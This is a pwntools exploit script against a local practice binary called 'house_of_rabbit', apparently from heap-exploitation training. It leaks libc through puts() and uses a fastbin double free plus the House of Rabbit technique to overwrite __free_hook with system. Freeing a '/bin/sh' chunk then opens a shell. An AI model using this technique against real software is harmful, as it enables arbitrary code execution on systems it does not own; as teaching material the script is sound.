#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_rabbit")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "amend age" option; send new value.
def amend_age(age):
    io.send(b"3")
    io.sendafter(b"age: ", f"{age}".encode())
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Enter "age" value.
age = 1

io.sendafter(b"age: ", f"{age}".encode())
io.recvuntil(b"> ")

large1 = malloc(0x5fff8, "D" * 8)
free(large1)
malloc(0x5fff8, "D" * 8)

# Request 2 fast chunks.
fast_A = malloc(24, b"A"*8)
fast_B = malloc(24, b"B"*8)

free(fast_A)
free(fast_B)
free(fast_A)

dup = malloc(24, p64(elf.sym["user"]))

large = malloc(0x88, "C" * 8)
free(large)

amend_age(0x80001)
malloc(0x80018, "D" * 8)

distance = (libc.sym["__free_hook"] - 0x20) - (elf.sym["user"])

amend_age(distance + 0x89)

binsh = malloc(distance, b"/bin/sh\x00")

malloc(0x18, p64(0xdeadbeef) + p64(libc.sym["system"]))

free(binsh)

# =============================================================================

io.interactive()
